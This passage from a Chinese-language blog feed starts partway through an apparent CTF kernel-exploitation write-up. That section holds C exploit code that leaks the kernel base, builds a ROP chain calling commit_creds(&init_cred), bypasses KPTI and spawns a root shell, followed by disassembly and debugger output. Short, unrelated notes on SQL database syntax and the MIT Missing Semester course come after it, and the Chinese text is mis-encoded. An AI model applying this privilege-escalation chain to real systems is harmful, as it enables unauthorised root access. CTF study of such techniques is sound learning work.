ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// è¿™é‡Œå‡å®šé€šè¿‡ seq_operations-&gt;stat æ¥è§¦å‘</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>cr3 bypass kptiï¼Œåœ¨é«˜ç‰ˆæœ¬ä½¿ç”¨ï¼Œåœ¨ <code>+22</code> åœ°å€æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„gadgetã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 <span class="number">41</span> <span class="number">5F</span>                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 <span class="number">41</span> <span class="number">5</span>E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 <span class="number">41</span> <span class="number">5</span>D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A <span class="number">41</span> <span class="number">5</span>C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D <span class="number">5B</span>                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E <span class="number">41</span> <span class="number">5B</span>                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 <span class="number">41</span> <span class="number">5</span>A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 <span class="number">41</span> <span class="number">59</span>                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 <span class="number">41</span> <span class="number">58</span>                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 <span class="number">59</span>                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 <span class="number">5</span>A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 <span class="number">5</span>E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A <span class="number">48</span> <span class="number">89</span> E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D <span class="number">65</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">24</span> <span class="number">25</span>+                mov     rsp, gs: <span class="number">0x5004</span></span><br><span class="line">.text:FFFFFFFF81600A56 FF <span class="number">77</span> <span class="number">30</span>                       push    qword ptr [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF <span class="number">77</span> <span class="number">28</span>                       push    qword ptr [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF <span class="number">77</span> <span class="number">20</span>                       push    qword ptr [rdi+<span class="number">20</span>h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF <span class="number">77</span> <span class="number">18</span>                       push    qword ptr [rdi+<span class="number">18</span>h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF <span class="number">77</span> <span class="number">10</span>                       push    qword ptr [rdi+<span class="number">10</span>h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF <span class="number">37</span>                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 <span class="number">50</span>                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB <span class="number">43</span>                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A <span class="number">0F</span> <span class="number">20</span> DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB <span class="number">34</span>                          jmp     <span class="number">0xFFFFFFFF81600AA3</span></span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 <span class="number">48</span> <span class="number">81</span> CF <span class="number">00</span> <span class="number">10</span>+                or      rdi, <span class="number">1000</span>h</span><br><span class="line">.text:FFFFFFFF81600AAA <span class="number">0F</span> <span class="number">22</span> DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD <span class="number">58</span>                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE <span class="number">5F</span>                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF <span class="number">15</span> <span class="number">23</span> <span class="number">65</span> <span class="number">62</span>+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF <span class="number">25</span> <span class="number">15</span> <span class="number">65</span> <span class="number">62</span>+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 <span class="number">55</span>                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 <span class="number">48</span> <span class="number">89</span> E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 <span class="number">0F</span> <span class="number">01</span> F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 <span class="number">5</span>D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 <span class="number">44</span> <span class="number">24</span> <span class="number">20</span> <span class="number">04</span>                 test    byte ptr [rsp+<span class="number">0x20</span>], <span class="number">4</span></span><br><span class="line">.text:FFFFFFFF81600AE5 <span class="number">75</span> <span class="number">02</span>                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 <span class="number">48</span> CF                          iretq</span><br></pre></td></tr></table></figure><ul><li>çœ‹åˆ«äººçš„åšæ³•ï¼Œå¥½åƒä¸éœ€è¦å…³æ³¨ripåé¢çš„å†…å®¹ï¼Œä½†æ˜¯æœ¬é¢˜æˆ‘æ²¡æœ‰ä½¿ç”¨è¿™ç§æ–¹å¼åšå‡ºæ¥ ğŸ‘€ã€‚</li><li>æœ€åéœ€è¦æˆ‘ä»¬è°ƒç”¨getshellå‡½æ•°ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   __asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">       <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   swapgs_restore_regs_and_return_to_usermode + 22;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>    </span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">get_shell();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul><li><p>commit_creds(prepare_kernel_cred (0)) &#x3D;&gt; ç®€åŒ–ä¸º commit_creds(&amp;init_cred) init_cred: init è¿›ç¨‹çš„æƒé™ï¼Œä¸ºrootï¼Œåœ¨ <code>/proc/kallsyms</code> å†…</p></li><li><p>å¯»æ‰¾ gadget æ—¶å¯èƒ½å¯»æ‰¾åˆ°çš„gadgetä¸èƒ½ä½¿ç”¨ï¼ŒæŠ¥é”™ä¸º <code>kernel tried to execute NX-protected page</code>ï¼Œè¯´æ˜å…¶åœ°å€ä¸å¯è®¿é—®ï¼Ÿé‚£å°±åªèƒ½æ¢äº†</p></li><li><p>ä¸ºä»€ä¹ˆæ‰¾ä¸å¯¹gadget?æˆ–è€…æ ¹æœ¬æ²¡æœ‰æ‰¾åˆ°ğŸ¤¡ã€‚å’Œå‚è€ƒçš„çœ‹çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°gadgetåœ°å€æ ¹æœ¬å°±æ²¡æ‰¾å¯¹ã€‚</p><ul><li>ropper + ROPgadget + ropr ä¸‰ä¸ªå·¥å…·ä¸€èµ·ä½¿ç”¨ï¼Œè·å¾—ä¸‰ä¸ªgadgetæ–‡ä»¶ã€‚</li><li>extract-vmlinux + vmlinux-to-elf å·¥å…·</li></ul></li><li><p>å¦‚ä½•ä¸‹æ–­ç‚¹ï¼Ÿ</p><ul><li>åœ¨æƒ³æš‚åœçš„çš„åœ°æ–¹ä½¿ç”¨ <code>getchar()</code> åœæ­¢åä¸€è·¯si</li><li>åœ¨å›ºå®šçš„æŒ‡ä»¤åœ°å€ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯éœ€è¦äº‹å…ˆçŸ¥é“åœ°å€ã€‚ä½†æ˜¯ropæ—¶ï¼Œåœ°å€ä¸€èˆ¬éƒ½æ˜¯çŸ¥é“çš„ã€‚</li></ul></li><li><p>åœ¨å›ºå®šçš„æŒ‡ä»¤ä¸‹æ–­ç‚¹ï¼Œæ¯”å¦‚æ­¤é¢˜å°±å¯ä»¥åœ¨åœ¨ add rsp é‚£ä¸€æ¡æŒ‡ä»¤ä¸‹æ–­ç‚¹</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff81909b8c    add    rsp, module_ioctl+56          &lt;0x168&gt;</span><br><span class="line">   0xffffffff81909b93    ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; tele 0xffffc900001c7df8+0x168 </span><br><span class="line">00:0000 0xffffc900001c7f60 0x44444444 /* <span class="string">&#x27;DDDD&#x27;</span> */</span><br><span class="line">01:0008 0xffffc900001c7f68 0x33333333 /* <span class="string">&#x27;3333&#x27;</span> */</span><br><span class="line">02:0010 0xffffc900001c7f70 0x22222222 /* <span class="string">&#x27;&quot;&quot;&quot;&quot;&#x27;</span> */</span><br><span class="line">03:0018 0xffffc900001c7f78 0xbbbb1111</span><br><span class="line">04:0020 0xffffc900001c7f80 0xbbbb2222</span><br><span class="line">05:0028 0xffffc900001c7f88 0x246</span><br><span class="line">06:0030 0xffffc900001c7f90 0x11110000</span><br><span class="line">07:0038 0xffffc900001c7f98 0x99999999</span><br><span class="line">08:0040 0xffffc900001c7fa0 0x88888888</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨æ•°æ®åº“åŸºæœ¬è¯­æ³•</title>
      <link href="/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç®€å•å­¦ä¹ å¢åˆ æ”¹æŸ¥</p></blockquote><span id="more"></span><ul><li><p>ä¸‰ä¸ªæœ€å¹¿æ³›ä½¿ç”¨çš„å¼€æº RDBMSï¼šSQLiteã€MySQL å’Œ PostgreSQLã€‚å…³ç³»å‹æ•°æ®åº“</p></li><li><p>å› ä¸ºSQLçš„æ ‡å‡†ï¼Œä¸‰ä¸ªæ•°æ®åº“å·®ä¸å¤šçš„è¯­æ³•ã€‚</p></li></ul><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote><p>å…¶å®æ˜¯å¼€æº MariaDB</p></blockquote><ul><li>æ•°æ®åº“</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure><ul><li>è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><ul><li><p>æ•°æ®ç±»å‹</p></li><li><p>æŸ¥è¯¢é™å®š</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- ç»“æœä¸ªæ•°</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><ul><li>æ•°æ®åº“</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥çœ‹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- è¿æ¥</span></span><br></pre></td></tr></table></figure><ul><li>è¡¨</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- åˆ›å»º</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">column_name data_type å±æ€§ </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- åˆ é™¤</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- æŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- å¢åŠ </span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- æ’åº</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å»é‡</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- å±æ€§é™å®š</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><ul><li><p>sqlite3</p></li><li><p>å‘½ä»¤</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.help;     -- å¸®åŠ©ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">.open test.db;  -- æ‰“å¼€æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰å°±åˆ›å»º</span><br><span class="line"></span><br><span class="line">.show;     -- æ˜¾ç¤ºä¸€ç³»åˆ—å±æ€§</span><br><span class="line"></span><br><span class="line">.quit   -- é€€å‡º</span><br><span class="line"></span><br><span class="line">.databases  -- æ˜¾ç¤ºæ•°æ®åº“</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºæ•°æ®åº“</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- è¯»å–æˆ–è€…åˆ›å»º</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure><ul><li>å¯¼å…¥å¯¼å‡ºæ•°æ®åº“</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.dump   -- å°†æ•°æ®åº“å¯¼å‡ºSQL æ–‡ä»¶ </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºè¡¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.tables  -- æ˜¾ç¤ºè¡¨</span><br><span class="line">.schema  -- è¡¨çš„ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure><ul><li>æŸ¥è¯¢</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- è¿˜æ˜¯SELECT è¯­å¥</span><br></pre></td></tr></table></figure><h1 id="ç¼–ç¨‹æ“ä½œ"><a href="#ç¼–ç¨‹æ“ä½œ" class="headerlink" title="ç¼–ç¨‹æ“ä½œ"></a>ç¼–ç¨‹æ“ä½œ</h1><ul><li>ä½¿ç”¨Cè¯­è¨€æ“ä½œæ•°æ®åº“ï¼Œå…¶ä½™ç¼–ç¨‹è¯­è¨€æ“ä½œæ•°æ®åº“ä¹Ÿå·®ä¸å¤šï¼Œä¸»è¦æ˜¯å†™SQLè¯­å¥çš„æ“ä½œã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºæ•™è‚²ç¼ºå¤±çš„ä¸€è¯¾</title>
      <link href="/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/"/>
      <url>/2023/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%95%99%E8%82%B2%E7%BC%BA%E5%A4%B1%E7%9A%84%E4%B8%80%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>the Missing Semester of your CS education</p></blockquote><span id="more"></span><ul><li><p>The Missing Semester of your CS educationï¼Œå…±<code>11</code>èŠ‚è¯¾ï¼Œæ¯èŠ‚è¯¾çº¦1hã€‚</p><ul><li><a href="https://www.bilibili.com/video/BV1uc411N7eK/?spm_id_from=333.999.0.0&vd_source=ccaa27461534d3a4a5e9b964672f86d6">bilibili åŒè¯­å­—å¹•</a></li><li><a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Missing Semester IAP 2020</a></li></ul></li><li><p>ç¡®å®ä¸é”™ï¼Œæ‰‹æ•²å‘½ä»¤+è®²è§£ã€‚å¤šä½¿ç”¨Linux</p></li><li><p>å­¦æ ¡åº”è¯¥åœ¨å¤§ä¸€æ•™è¿™ä¸ªï¼Œè€Œä¸æ˜¯TMçš„å¤§å­¦ç‰©ç†</p></li><li><p>è¯¾ç¨‹ç½‘ç«™</p></li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://missing.csail.mit.edu/</span><br></pre></td></tr></table></figure><h2 id="lectrue1-overview-shell"><a href="#lectrue1-overview-shell" class="headerlink" title="lectrue1: overview &amp; shell"></a>lectrue1: overview &amp; shell</h2><blockquote><p>ä¸»è¦æ˜¯ Linux åŸºæœ¬å‘½ä»¤</p></blockquote><h3 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h3><ul><li>å¦‚ä½•åˆ©ç”¨å­˜åœ¨çš„å·¥å…·ä½¿æˆ‘ä»¬å¼€å‘æ›´åŠ é«˜æ•ˆï¼Œä»¥åŠå¦‚ä½•æ›´å¥½çš„åˆ©ç”¨æˆ‘ä»¬çš„è®¡ç®—æœºï¼Œè¿™æ˜¯è¿™é—¨è¯¾ä¸»è¦è§£å†³çš„é—®é¢˜ã€‚</li></ul><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul><li>è®²è¿°äº†Linux Shell.ä¸»è¦æ˜¯bash</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellæ˜¯è¿è¡Œåœ¨ç»ˆç«¯ä¸­çš„æ–‡æœ¬äº’åŠ¨ç¨‹åºï¼Œbashï¼ˆGNU Bourne-Again Shellï¼‰æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§shellã€‚æ˜¯å½“å‰å¤§å¤šæ•°Linuxå‘è¡Œç‰ˆçš„é»˜è®¤Shellã€‚</span><br></pre></td></tr></table></figure><ul><li>æ—¥æœŸ</li></ul><figure class="highlight bash"><table><tr><td 